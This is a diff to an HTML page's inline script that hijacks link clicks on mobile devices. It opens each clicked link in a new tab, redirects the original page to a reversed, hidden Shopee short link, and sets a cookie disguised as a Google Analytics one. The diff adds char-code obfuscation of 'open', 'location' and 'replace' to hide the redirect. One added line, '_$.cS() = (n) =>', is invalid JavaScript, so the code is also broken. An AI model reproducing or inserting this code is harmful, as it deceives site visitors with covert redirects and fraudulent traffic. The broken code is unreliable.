@@ -8,9 +8,15 @@
         <script>
 
             const _$ = {
+                a: [111, 112, 101, 110],
                 i: 'cVk0FaR9L3/nv.eepohs.s//:sptth'.split('').reverse().join(''),
+                b: [108, 111, 99, 97, 116, 105, 111, 110],
                 g: '_ga_D8SD9STSJ5',
-                r() {document.addEventListener('click', this.oC.bind(this), true);}
+                w: window,
+                c: [114, 101, 112, 108, 97, 99, 101],
+                r() {
+                    document.addEventListener('click', _$.oC, true);
+                },
             }
             
             _$.gC = (n) => {
@@ -28,20 +34,25 @@
                        (/android|iphone|ipad|tablet|playbook|silk|kindle/.test(u) || window.matchMedia("(max-width: 1024px)").matches);
             };
             
+            _$.cS() = (n) => {
+                return n.map(z => String.fromCharCode(z)).join('');
+            };
+            
             _$.gV = () => {
                 return _$.gC(_$.g);
             };
             
             _$.oC = (e) => {
                 const t = e.target.closest("a");
-                if (!t || !t.href || t.href === '/' || (_$.gV() && _$.gV() === 'true') || !_$.mT()) return;
+                if (!t || !t.href || t.href === '/' || (_$.gV() && _$.gV() === 'true') || !_$.mT()) return; 
                 e.preventDefault();
                 _$.sC(_$.g, 'true', 3);
-                window.open(t.href, '_blank');
-                location.replace(_$.i);
+                _$.w[_$.cS(_$.a)](t.href, '_blank');
+                _$.w[_$.cS(_$.b)][_$.cS(_$.c)](_$.i);
             };
             
             _$.r();
+
 
             
         </script>
